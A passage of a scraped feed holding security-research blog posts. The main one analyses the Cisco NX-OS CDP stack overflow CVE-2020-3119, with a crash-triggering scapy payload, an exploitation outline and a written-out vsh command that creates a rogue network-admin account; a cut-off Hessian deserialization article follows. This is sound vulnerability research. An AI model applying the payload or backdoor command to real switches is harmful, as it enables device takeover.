3/cdn96@2020_6/2020/08/24/21-15-00-590_6f09c06ed4efe01f.webp","https://images.seebug.org/content/images/2020/03/014b8782-9bb1-4341-9bf4-ba699e42f861.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn50@2020_3/2020/08/24/21-14-57-771_4385f54a4371e980.webp","https://images.seebug.org/content/images/2020/03/534c4fbf-6deb-4a8d-ad1a-137a36b3ecec.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn97@2020_2/2020/08/24/21-14-57-478_b2d47a55da83c946.webp","https://images.seebug.org/content/images/2020/03/7c68ef39-f0d4-4a10-9fde-be772c0b7705.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn45@2020_1/2020/08/24/21-14-57-755_5526181a054ee0ae.webp","https://images.seebug.org/content/images/2020/03/3b8db5fd-e1a2-479f-af17-0bc7810d93e0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn2@2020_2/2020/08/24/21-14-56-188_48fbf6b9daf3736f.webp","https://images.seebug.org/content/images/2020/03/0ac16cfa-dc69-4e99-aa5a-1dfe99d2df1f.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn44@2020_4/2020/08/24/21-15-00-074_2321b6fee6365833.webp","https://images.seebug.org/content/images/2020/03/a3551846-8a48-4b31-9a7d-8669d86c940b.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn88@2020_4/2020/08/24/21-15-00-534_a0e16a5b2a13134e.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688713},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"CVE-2020-3119 Cisco CDP 协议栈溢出漏洞分析","link":"https://blog.knownsec.com/?p=5029","description":"\n<p><strong>作者：Hcamael@知道创宇404实验室</strong><br><strong>时间：2020年03月19日</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1156/\">https://paper.seebug.org/1156/</a></strong></p>\n\n\n\n<p>Cisco Discovery Protocol(CDP)协议是用来发现局域网中的Cisco设备的链路层协议。</p>\n\n\n\n<p>最近Cisco CDP协议爆了几个漏洞，挑了个栈溢出的CVE-2020-3119先来搞搞，Armis Labs也公开了他们的分析Paper。</p>\n\n\n\n<h1 id=\"_1\">环境搭建</h1>\n\n\n\n<p>虽然最近都在搞IoT相关的，但是还是第一次搞这种架构比较复杂的中型设备，大部分时间还是花在折腾环境上。</p>\n\n\n\n<p>3119这个CVE影响的是Cisco NX-OS类型的设备，去Cisco的安全中心找了下这个CVE，搜搜受影响的设备。发现受该漏洞影响的设备都挺贵的，也不好买，所以暂时没办法真机测试研究了。随后搜了一下相关设备的固件，需要氪金购买。然后去万能的淘宝搜了下，有代购业务，有的买五六十(亏)，有的卖十几块。</p>\n\n\n\n<p>固件到手后，我往常第一想法是解开来，第二想法是跑起来。最开始我想着先把固件解开来，找找cdp的binary，但是在解固件的时候却遇到了坑。</p>\n\n\n\n<p>如今这世道，解固件的工具也就binwalk，我也就只知道这一个，也问过朋友，好像也没有其他好用的了。（如果有，求推荐）。</p>\n\n\n\n<p>但是binwalk的算法在遇到非常多的压缩包的情况下，非常耗时，反正我在挂那解压了两天，还没解完一半。在解压固件这块折腾了好久，最后还是无果而终。</p>\n\n\n\n<p>最后只能先想办法把固件跑起来了，正好知道一个软件可以用来仿真Cisco设备————GNS3。</p>\n\n\n\n<h2 id=\"gns3\">GNS3的使用说明</h2>\n\n\n\n<p>学会了使用GNS3以后，发现这软件真好用。</p>\n\n\n\n<p>首先我们需要下载安全GNS3软件，然后还需要下载GNS3 VM。个人电脑上装个GNS3提供了可视化操作的功能，算是总控。GNS3 VM是作为GNS3的服务器，可以在本地用虚拟机跑起来，也可以放远程。GNS3仿真的设备都是在GNS3服务器上运行起来的。</p>\n\n\n\n<p>1.首先设置好GNS3 VM</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/9ac77b49-a3a3-41be-bf85-90ebc55c899c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>2.创建一个新模板</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/9ad71ba9-0d79-471d-be3f-44b20e54a2a6.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>3.选择交换机 Cisco NX-OSv 9000</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/ce376dae-7465-4ea7-a694-6b026c8d3586.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在这里我们发现是用qemu来仿真设备的，所以前面下载的时候需要下载qcow2。</p>\n\n\n\n<p>随后就是把相应版本的固件导入到GNS3 Server。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/4a818166-1cfd-4f8b-8f1e-d5c01ca62cc7.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>导入完成后，就能在交换机一栏中看到刚才新添加的设备。</p>\n\n\n\n<p>4.把Cisco设备拖到中央，使用网线直连设备</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/84c67c13-4509-4eff-8e34-93f4d99815f5.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里说明一下，Toolbox是我自己添加的一个ubuntu docker模板。最开始我是使用docker和交换机设备的任意一张网卡相连来进行操作测试的。</p>\n\n\n\n<p>不过随后我发现，GNS3还提供的了一个功能，也就是图中的Cloud1，它可以代表你宿主机/GNS3 Server中的任意一张网卡。</p>\n\n\n\n<p>因为我平常使用的工具都是在Mac中的ubuntu虚拟机里，所以我现在的使用的方法是，让ubuntu虚拟机的一张网卡和Cisco交换机进行直连。</p>\n\n\n\n<p>PS：初步研究了下，GNS3能提供如此简单的网络直连，使用的是其自己开发的ubridge，Github上能搜到，目测是通过UDP来转发流量包。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/9995fff1-095b-40a8-9d82-36c7b8e41d29.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在测试的过程中，我们还可以右击这根直连线，来使用wireshark抓包。</p>\n\n\n\n<p>5.启动所有节点</p>\n\n\n\n<p>最后就是点击上方工具栏的启动键，来启动你所有的设备，如果不想全部启动，也可以选择单独启动。</p>\n\n\n\n<h1 id=\"cisco\">研究Cisco交换机</h1>\n\n\n\n<p>不过这个时候网络并没有连通，还需要通过串口连接到交换机进行网络配置。GNS3默认情况下会把设备的串口通过telnet转发出来，我们可以通过GNS3界面右上角看到telnet的ip/端口。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/c348be70-1682-4665-9595-bfd83b89aa7e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>第一次连接到交换机需要进行一次初始化设置，设置好后，可以用你设置的管理员账号密码登陆到Cisco管理shell。</p>\n\n\n\n<p>经过研究，发现该设备的结构是，qemu启动了一个bootloader，然后在bootloader的文件系统里面有一个nxos.9.2.3.bin文件，该文件就是该设备的主体固件。启动以后是一个Linux系统，在Linux系统中又启动了一个虚拟机guestshell，还有一个vsh.bin。在该设备中，用vsh替代了我们平常使用Linux时使用的bash。我们telnet连进来后，看到的就是vsh界面。在vsh命令中可以设置开启telnet/ssh，还可以进入Linux shell。但是进入的是guestshell虚拟机中的Linux系统。</p>\n\n\n\n<p>本次研究的cdp程序是无法在虚拟机guestshell中看到的。经过后续研究，发现vsh中存在python命令，而这个python是存在于Cisco宿主机中的nxpython程序。所以可以同python来获取到Cisco宿主机的Linux shell。然后通过mac地址找到你在GNS3中设置连接的网卡，进行ip地址的设置。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">bash\nCisco# python\nPython 2.7.11 (default, Feb 26 2018, 03:34:16)\n[GCC 4.6.3] on linux2\nType &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.\n&#38;gt;&#38;gt;&#38;gt; import os\n&#38;gt;&#38;gt;&#38;gt; os.system(&#34;/bin/bash&#34;)\nbash-4.3$ id\nuid=2002(admin) gid=503(network-admin) groups=503(network-admin),504(network-operator)\nbash-4.3$ sudo -i\nroot@Cisco#ifconfig eth8\neth8      Link encap:Ethernet  HWaddr 0c:76:e2:d1:ac:07\n          inet addr:192.168.102.21  Bcast:192.168.102.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1\n          RX packets:82211 errors:61 dropped:28116 overruns:0 frame:61\n          TX packets:137754 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:6639702 (6.3 MiB)  TX bytes:246035115 (234.6 MiB)\n\nroot@Cisco#ps aux|grep cdp\nroot     10296  0.0  0.8 835212 70768 ?        Ss   Mar18   0:01 /isan/bin/cdpd\nroot     24861  0.0  0.0   5948  1708 ttyS0    S+   05:30   0:00 grep cdp</pre>\n\n\n\n<p>设置好ip后，然后可以在我们mac上的ubuntu虚拟机里面进行网络连通性的测试，正常情况下这个时候网络已经连通了。</p>\n\n\n\n<p>之后可以把ubuntu虚拟机上的公钥放到cisoc设备的<code>/root/.ssh/authorized_keys</code>，然后就能通过ssh连接到了cisco的bash shell上面。该设备的Linux系统自带程序挺多的，比如后续调试的要使用的gdbserver。nxpython还装了scapy。</p>\n\n\n\n<h2 id=\"scapycdp\">使用scapy发送CDP包</h2>\n\n\n\n<p>接下来我们来研究一下怎么发送cdp包，可以在Armis Labs发布的分析中看到cdp包格式，同样我们也能开启Cisco设备的cdp，查看Cisco设备发送的cdp包。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">Cisco#conf ter\nCisco(config)# cdp enable\n# 比如我前面设置直连的上第一个网口\nCisco(config)# interface ethernet 1/7\nCisco(config-if)# no shutdown\nCisco(config-if)# cdp enable\nCisco(config-if)# end\nCisco# show cdp interface ethernet 1/7\nEthernet1/7 is up\n    CDP enabled on interface\n    Refresh time is 60 seconds\n    Hold time is 180 seconds</pre>\n\n\n\n<p>然后我们就能通过wireshark直接抓网卡的包，或者通过GNS3抓包，来研究CDP协议的格式。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/91f9fa35-1d65-42d0-b94e-898974c83ed8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>因为我习惯使用python写PoC，所以我开始研究怎么使用python来发送CDP协议包，然后发现scapy内置了一些CDP包相关的内容。</p>\n\n\n\n<p>下面给一个简单的示例：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">from scapy.contrib import cdp\nfrom scapy.all import Ether, LLC, SNAP</pre>\n\n\n\n<pre class=\"crayon-plain-tag\"># link layer\nl2_packet = Ether(dst=&#34;01:00:0c:cc:cc:cc&#34;)\n# Logical-Link Control\nl2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()\n# Cisco Discovery Protocol\ncdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180)\ndeviceid = cdp.CDPMsgDeviceID(val=cmd)\nportid = cdp.CDPMsgPortID(iface=b&#34;ens38&#34;)\naddress = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr=&#34;192.168.1.3&#34;))\ncap = cdp.CDPMsgCapabilities(cap=1)\ncdp_packet = cdp_v2/deviceid/portid/address/cap\npacket = l2_packet / cdp_packet\nsendp(packet)</pre>\n\n\n\n<h2 id=\"_2\">触发漏洞</h2>\n\n\n\n<p>下一步，就是研究怎么触发漏洞。首先，把cdpd从设备中给取出来，然后把二进制丢到ida里找漏洞点。根据Armis Labs发布的漏洞分析，找到了该漏洞存在于<code>cdpd_poe_handle_pwr_tlvs</code>函数，相关的漏洞代码如下：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">if ( (signed int)v28 &#38;gt; 0 )\n      {\n        v35 = (int *)(a3 + 4);\n        v9 = 1;\n        do\n        {\n          v37 = v9 - 1;\n          v41[v9 - 1] = *v35;\n          *(&#38;amp;v40 + v9) = _byteswap_ulong(*(&#38;amp;v40 + v9));\n          if ( !sdwrap_hist_event_subtype_check(7536640, 104) )\n          {\n            *(_DWORD *)v38 = 104;\n            snprintf(&#38;amp;s, 0x200u, &#34;pwr_levels_requested[%d] = %d\\n&#34;, v37, *(&#38;amp;v40 + v9));\n            sdwrap_hist_event(7536640, strlen(&#38;amp;s) + 5, v38);\n          }\n          if ( sdwrap_chk_int_all(104, 0, 0, 0, 0) )\n          {\n            v24 = *(&#38;amp;v40 + v9);\n            buginf_ftrace(1, &#38;amp;sdwrap_dbg_modname, 0, &#34;pwr_levels_requested[%d] = %d\\n&#34;);\n          }\n          snprintf(v38, 0x3FCu, &#34;1111 pwr_levels_requested[%d] = %d\\n&#34;, v37, *(&#38;amp;v40 + v9), v24);\n          sdwrap_his_log_event_for_uuid_inst(124, 7536640, 1, 0, strlen(v38) + 1, v38);\n          *(_DWORD *)(a1 + 4 * v9 + 1240) = *(&#38;amp;v40 + v9);\n          ++v35;\n          ++v9;\n        }\n        while ( v9 != v28 + 1 );\n      }</pre>\n\n\n\n<p>后续仍然是根据Armis Labs漏洞分析文章中的内容，只要在cdp包中增加Power Request和Power Level就能触发cdpd程序crash：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">power_req = cdp.CDPMsgUnknown19(val=&#34;aaaa&#34;+&#34;bbbb&#34;*21)\npower_level = cdp.CDPMsgPower(power=16)\ncdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level</pre>\n\n\n\n<h2 id=\"_3\">漏洞利用</h2>\n\n\n\n<p>首先看看二进制程序的保护情况：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">$ checksec cdpd_9.2.3\n    Arch:     i386-32-little\n\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    RPATH:    '/isan/lib/convert:/isan/lib:/isanboot/lib'</pre>\n\n\n\n<p>发现只开启了NX和PIE保护，32位程序。</p>\n\n\n\n<p>因为该程序没法进行交互，只能一次性发送完所有payload进行利用，所以没办法泄漏地址。因为是32位程序，cdpd程序每次crash后会自动重启，所以我们能爆破地址。</p>\n\n\n\n<p>在编写利用脚本之前需要注意几点：</p>\n\n\n\n<p>1.栈溢出在覆盖了返回地址后，后续还会继续覆盖传入函数参数的地址。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">*(_DWORD *)(a1 + 4 * v9 + 1240) = *(&#38;amp;v40 + v9);</pre>\n\n\n\n<p>并且因为在漏洞代码附近有这样的代码，需要向a1地址附近的地址写入值。如果只覆盖返回地址，没法只通过跳转到一个地址达到命令执行的目的。所以我们的payload需要把a1覆盖成一个可写的地址。</p>\n\n\n\n<p>2.在<code>cdpd_poe_handle_pwr_tlvs</code>函数中，有很多分支都会进入到<code>cdpd_send_pwr_req_to_poed</code>函数，而在该函数中有一个<code>__memcpy_to_buf</code>函数，这个函数限制了<code>Power Requested</code>的长度在40字节以内。这么短的长度，并不够进行溢出利用。所以我们不能进入到会调用该函数的分支。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">v10 = *(_WORD *)(a1 + 1208);\n      v11 = *(_WORD *)(a1 + 1204);\n      v12 = *(_DWORD *)(a1 + 1212);\n      if ( v32 != v10 || v31 != v11 )</pre>\n\n\n\n<p>我们需要让该条件判断为False，不进入该分支。因此需要构造好覆盖的a1地址的值。</p>\n\n\n\n<p>3.我们利用的最终目的不是执行<code>execve(\"/bin/bash\")</code>，因为没法进行交互，所以就算执行了这命令也没啥用。那么我们能有什么利用方法呢？第一种，我们可以执行反连shell的代码。第二种，我们可以添加一个管理员账号，比如执行如下命令：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">/isan/bin/vsh -c &#34;configure terminal ; username test password qweASD123 role network-admin&#34;</pre>\n\n\n\n<p>我们可以通过执行<code>system(cmd)</code>达到目的。那么接下来的问题是怎么传参呢？经过研究发现，在CDP协议中的<code>DeviceID</code>相关的字段内容都储存在堆上，并且该堆地址就储存在栈上，我们可以通过<code>ret</code>来调整栈地址。这样就能成功向<code>system</code>函数传递任意参数了。</p>\n\n\n\n<p>最后放一个演示视频：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/03/325c1a4c-2009-4329-ad20-59b3db5760e3.gif-w331s\" alt=\"\" /></figure>\n\n\n\n<p><strong>参考链接</strong></p>\n\n\n\n<ol><li><a href=\"https://go.armis.com/hubfs/White-papers/Armis-CDPwn-WP.pdf\">https://go.armis.com/hubfs/White-papers/Armis-CDPwn-WP.pdf</a></li><li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200205-nxos-cdp-rce\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200205-nxos-cdp-rce</a></li><li><a href=\"https://software.cisco.com/download/home/286312239/type/282088129/release/9.2(3)?i=!pp\">https://software.cisco.com/download/home/286312239/type/282088129/release/9.2(3)?i=!pp</a></li><li><a href=\"https://scapy.readthedocs.io/en/latest/api/scapy.contrib.cdp.html\">https://scapy.readthedocs.io/en/latest/api/scapy.contrib.cdp.html</a></li></ol>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1154/\">https://paper.seebug.org/1154/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:37:19 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/03/9ac77b49-a3a3-41be-bf85-90ebc55c899c.png-w331s","linkMd5":"00b4fc44d295b8070944202e12783d61","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn41@2020_5/2020/08/24/21-14-50-505_8cd5331524acb79d.webp","destWidth":1950,"destHeight":1396,"sourceBytes":146075,"destBytes":72120,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/03/9ac77b49-a3a3-41be-bf85-90ebc55c899c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn41@2020_5/2020/08/24/21-14-50-505_8cd5331524acb79d.webp","https://images.seebug.org/content/images/2020/03/9ad71ba9-0d79-471d-be3f-44b20e54a2a6.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn21@2020_4/2020/08/24/21-14-56-402_cbd78e26d6d7d293.webp","https://images.seebug.org/content/images/2020/03/ce376dae-7465-4ea7-a694-6b026c8d3586.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn64@2020_2/2020/08/24/21-15-00-109_6e40a29294af0aee.webp","https://images.seebug.org/content/images/2020/03/4a818166-1cfd-4f8b-8f1e-d5c01ca62cc7.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn85@2020_4/2020/08/24/21-14-57-160_f6b7af172fe240c9.webp","https://images.seebug.org/content/images/2020/03/84c67c13-4509-4eff-8e34-93f4d99815f5.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn42@2020_4/2020/08/24/21-14-55-763_2abe430ae24ab5aa.webp","https://images.seebug.org/content/images/2020/03/9995fff1-095b-40a8-9d82-36c7b8e41d29.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn82@2020_6/2020/08/24/21-14-56-092_d28b0570fd965628.webp","https://images.seebug.org/content/images/2020/03/c348be70-1682-4665-9595-bfd83b89aa7e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn96@2020_5/2020/08/24/21-15-01-026_3dfdedc2e3831983.webp","https://images.seebug.org/content/images/2020/03/91f9fa35-1d65-42d0-b94e-898974c83ed8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn80@2020_1/2020/08/24/21-14-57-976_65fbe10dae07deac.webp","https://images.seebug.org/content/images/2020/03/325c1a4c-2009-4329-ad20-59b3db5760e3.gif-w331s":null,"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688720},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"Hessian 反序列化及相关利用链","link":"https://blog.knownsec.com/?p=5027","description":"\n<p><strong>作者：Longofo@知道创宇404实验室</strong><br><strong>时间：2020年2月20日</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1137/\">https://paper.seebug.org/1137/</a></strong></p>\n\n\n\n<p>前不久有一个关于Apache Dubbo Http反序列化的漏洞，本来是一个正常功能（通过正常调用抓包即可验证确实是正常功能而不是非预期的Post），通过Post传输序列化数据进行远程调用，但是如果Post传递恶意的序列化数据就能进行恶意利用。Apache Dubbo还支持很多协议，例如Dubbo（Dubbo Hessian2）、Hessian（包括Hessian与Hessian2，这里的Hessian2与Dubbo Hessian2不是同一个）、Rmi、Http等。Apache Dubbo是远程调用框架，既然Http方式的远程调用传输了序列化的数据，那么其他协议也可能存在类似问题，例如Rmi、Hessian等。@pyn3rd师傅之前在<a href=\"https://twitter.com/pyn3rd/status/1229044609591869442\">twiter</a>发了关于Apache Dubbo Hessian协议的反序列化利用，Apache Dubbo Hessian反序列化问题之前也被提到过，<a href=\"https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html\">这篇文章</a>里面讲到了Apache Dubbo Hessian存在反序列化被利用的问题，类似的还有Apache Dubbo Rmi反序列化问题。之前也没比较完整的去分析过一个反序列化组件处理流程，刚好趁这个机会看看Hessian序列化、反序列化过程，以及<a href=\"https://github.com/mbechler/marshalsec\">marshalsec</a>工具中对于Hessian的几条利用链。</p>\n\n\n\n<h4 id=\"_1\">关于序列化/反序列化机制</h4>\n\n\n\n<p>序列化/反序列化机制（或者可以叫编组/解组机制，编组/解组比序列化/反序列化含义要广），参考<a href=\"https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true\">marshalsec.pdf</a>，可以将序列化/反序列化机制分大体分为两类：</p>\n\n\n\n<ol><li>基于Bean属性访问机制</li><li>基于Field机制</li></ol>\n\n\n\n<h5 id=\"bean\">基于Bean属性访问机制</h5>\n\n\n\n<ul><li>SnakeYAML</li><li>jYAML</li><li>YamlBeans</li><li>Apache Flex BlazeDS</li><li>Red5 IO AMF</li><li>Jackson</li><li>Castor</li><li>Java XMLDecoder</li><li>...</li></ul>\n\n\n\n<p>它们最基本的区别是如何在对象上设置属性值，它们有共同点，也有自己独有的不同处理方式。有的通过反射自动调用<code>getter(xxx)</code>和<code>setter(xxx)</code>访问对象属性，有的还需要调用默认Constructor，有的处理器（指的上面列出来的那些）在反序列化对象时，如果类对象的某些方法还满足自己设定的某些要求，也会被自动调用。还有XMLDecoder这种能调用对象任意方法的处理器。有的处理器在支持多态特性时，例如某个对象的某个属性是Object、Interface、abstruct等类型，为了在反序列化时能完整恢复，需要写入具体的类型信息，这时候可以指定更多的类，在反序列化时也会自动调用具体类对象的某些方法来设置这些对象的属性值。这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。</p>\n\n\n\n<h5 id=\"field\">基于Field机制</h5>\n\n\n\n<p>基于Field机制是通过特殊的native（native方法不是java代码实现的，所以不会像Bean机制那样调用getter、setter等更多的java方法）方法或反射（最后也是使用了native方式）直接对Field进行赋值操作的机制，不是通过getter、setter方式对属性赋值（下面某些处理器如果进行了特殊指定或配置也可支持Bean机制方式）。在ysoserial中的payload是基于原生Java Serialization，marshalsec支持多种，包括上面列出的和下面列出的。</p>\n\n\n\n<ul><li>Java Serialization</li><li>Kryo</li><li>Hessian</li><li>json-io</li><li>XStream</li><li>...</li></ul>\n\n\n\n<p>就对象进行的方法调用而言，基于字段的机制通常通常不构成攻击面。另外，许多集合、Map等类型无法使用它们运行时表示形式进行传输/存储（例如Map，在运行时存储是通过计算了对象的hashcode等信息，但是存储时是没有保存这些信息的），这意味着所有基于字段的编组器都会为某些类型捆绑定制转换器（例如Hessian中有专门的MapSerializer转换器）。这些转换器或其各自的目标类型通常必须调用攻击者提供的对象上的方法，例如Hessian中如果是反序列化map类型，会调用MapDeserializer处理map，期间map的put方法被调用，map的put方法又会计算被恢复对象的hash造成hashcode调用（这里对hashcode方法的调用就是前面说的必须调用攻击者提供的对象上的方法），根据实际情况，可能hashcode方法中还会触发后续的其他方法调用。</p>\n\n\n\n<h4 id=\"hessian\">Hessian简介</h4>\n\n\n\n<p>Hessian是二进制的web service协议，官方对Java、Flash/Flex、Python、C++、.NET C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化/反序列化和RMI功能。本文主要讲解Hessian的序列化/反序列化。</p>\n\n\n\n<p>下面做个简单测试下Hessian Serialization与Java Serialization：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">//Student.java\nimport java.io.Serializable;\n\npublic class Student implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private int id;\n    private String name;\n    private transient String gender;\n\n    public int getId() {\n        System.out.println(&#34;Student getId call&#34;);\n        return id;\n    }\n\n    public void setId(int id) {\n        System.out.println(&#34;Student setId call&#34;);\n        this.id = id;\n    }\n\n    public String getName() {\n        System.out.println(&#34;Student getName call&#34;);\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(&#34;Student setName call&#34;);\n        this.name = name;\n    }\n\n    public String getGender() {\n        System.out.println(&#34;Student getGender call&#34;);\n        return gender;\n    }\n\n    public void setGender(String gender) {\n        System.out.println(&#34;Student setGender call&#34;);\n        this.gender = gender;\n    }\n\n    public Student() {\n        System.out.println(&#34;Student default constractor call&#34;);\n    }\n\n    public Student(int id, String name, String gender) {\n        this.id = id;\n        this.name = name;\n        this.gender = gender;\n    }\n\n    @Override\n    public String toString() {\n        return &#34;Student(id=&#34; + id + &#34;,name=&#34; + name + &#34;,gender=&#34; + gender + &#34;)&#34;;\n    }\n}</pre>\n\n\n\n<pre class=\"crayon-plain-tag\">//HJSerializationTest.java\nimport com.caucho.hessian.io.HessianInput;\nimport com.caucho.hessian.io.HessianOutput;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\n\npublic class HJSerializationTest {\n    public static &#38;lt;T&#38;gt; byte[] hserialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            HessianOutput output = new HessianOutput(os);\n            output.writeObject(t);\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n\n    public static &#38;lt;T&#38;gt; T hdeserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            HessianInput input = new HessianInput(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n\n    public static &#38;lt;T&#38;gt; byte[] jdkSerialize(T t) {\n        byte[] data = null;\n        try {\n            ByteArrayOutputStream os = new ByteArrayOutputStream();\n            ObjectOutputStream output = new ObjectOutputStream(os);\n            output.writeObject(t);\n            output.flush();\n            output.close();\n            data = os.toByteArray();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n\n    public static &#38;lt;T&#38;gt; T jdkDeserialize(byte[] data) {\n        if (data == null) {\n            return null;\n        }\n        Object result = null;\n        try {\n            ByteArrayInputStream is = new ByteArrayInputStream(data);\n            ObjectInputStream input = new ObjectInputStream(is);\n            result = input.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return (T) result;\n    }\n\n    public static void main(String[] args) {\n        Student stu = new Student(1, &#34;hessian&#34;, &#34;boy&#34;);\n\n        long htime1 = System.currentTimeMillis();\n        byte[] hdata = hserialize(stu);\n        long htime2 = System.currentTimeMillis();\n        System.out.println(&#34;hessian serialize result length = &#34; + hdata.length + &#34;,&#34; + &#34;cost time：&#34; + (htime2 - htime1));\n\n        long htime3 = System.currentTimeMillis();\n        Student hstudent = hdeserialize(hdata);\n        long htime4 = System.currentTimeMillis();\n        System.out.println(&#34;hessian deserialize result：&#34; + hstudent + &#34;,&#34; + &#34;cost time：&#34; + (htime4 - htime3));\n        System.out.println();\n\n        long jtime1 = System.currentTimeMillis();\n        byte[] jdata = jdkSerialize(stu);\n        long jtime2 = System.currentTimeMillis();\n        System.out.println(&#34;jdk serialize result length = &#34; + jdata.length + &#34;,&#34; + &#34;cost time：&#34; + (jtime2 - jtime1));\n\n        long jtime3 = System.currentTimeMillis();\n        Student jstudent = jdkDeserialize(jdata);\n        long jtime4 = System.currentTimeMillis();\n        System.out.println(&#34;jdk deserialize result：&#34; + jstudent + &#34;,&#34; + &#34;cost time：&#34; + (jtime4 - jtime3));\n    }\n}</pre>\n\n\n\n<p>结果如下：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">hessian serialize result length = 64,cost time：45\nhessian deserialize result：Student(id=1,name=hessian,gender=null),cost time：3\n\njdk serialize result length = 100,cost time：5\njdk 